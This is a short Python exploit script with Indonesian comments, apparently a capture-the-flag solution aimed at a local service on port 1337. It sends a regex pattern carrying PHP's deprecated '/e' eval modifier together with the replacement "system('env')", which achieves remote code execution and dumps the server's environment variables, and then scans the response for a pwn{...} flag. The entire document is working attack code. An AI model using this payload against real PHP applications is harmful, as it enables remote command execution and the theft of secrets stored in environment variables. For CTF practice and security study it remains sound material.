import requests
import re

# Port 1337 (External)
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Kita butuh 3 parameter POST:
    # 1. text: String yang mau di-match (Sembarang aja, asal match sama pattern)
    # 2. pattern: Regex pattern yang HARUS pake modifier 'e' di belakang
    # 3. replacement: Payload PHP kita yang bakal di-eval
    
    data = {
        'text': 'pwn_me',           # Teks sasaran
        'pattern': '/pwn_me/e',     # Pattern + modifier 'e' (Eval)
        'replacement': "system('env')" # Payload RCE
    }
    
    print(f"[*] Sending Payload with /e modifier...")
    
    try:
        r = requests.post(URL, data=data)
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Cari flag format pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed. Raw output (Check manually):")
                # system() nge-dump output langsung ke body HTML, biasanya di atas
                print(r.text[:1000]) 
        else:
            print(f"[-] Error Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()
